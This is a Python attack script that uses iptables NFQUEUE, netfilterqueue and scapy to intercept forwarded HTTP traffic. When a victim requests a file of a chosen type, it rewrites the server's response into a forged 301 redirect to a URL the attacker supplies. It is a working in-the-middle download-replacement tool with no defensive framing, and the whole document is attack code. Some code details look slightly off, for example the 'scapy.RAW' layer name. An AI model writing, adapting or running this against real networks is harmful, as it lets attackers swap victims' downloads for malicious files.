#!/usr/bin/env python

import netfilterqueue, subprocess
import scapy.all as scapy
import argparse

ack_list = []

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--file-type", dest="file_type", help="Set file extension type to check and redirect e.g .exe, .pdf, .jpg")
    parser.add_argument("-u", "--file-url", dest="file_url", help="Set redirect URL location for the file")
    options = parser.parse_args()
    if not options.file_type:
        parser.error("[-] Please specify a file type to check for using -t or --file-type options, use --help for more info.")
    if not options.file_url:
        parser.error("[-] Please specify a redirect url location for the file using -u or --file-url options, use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.RAW):
        if scapy_packet[scapy.TCP].dport == 80:
            if options.file_type in scapy_packet[scapy.RAW].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list: # Check if the request ack number is euqal to the response seq number
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")

                # set the loaded response to HTTP 301 redirect from actual file location to specified file location
                scapy_packet[scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + options.file_url + "\n\n"

                # Delete the length and checksum field allowing scapy to reset
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(str(scapy_packet))   # Set the modeified packet as the packet payload

    packet.accept() # Accept packet for forwarding

try:
    options = get_arguments()

    print("[+] Modifying iptables FORWARD chain...")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # create a queue rule using NFQUEUE in iptables

    queue = netfilterqueue.NetfilterQueue()     # Create a netfilterqueue object
    queue.bind(0, process_packet)   # Bind the queue object to the rule with queue number 0 and the callback function
    queue.run() # Send the queued packets to the callback function

except KeyboardInterrupt:
    print("\n[+] Resetting iptables FORWARD chain...")
    subprocess.call("iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True) # delete the queue rule in iptables
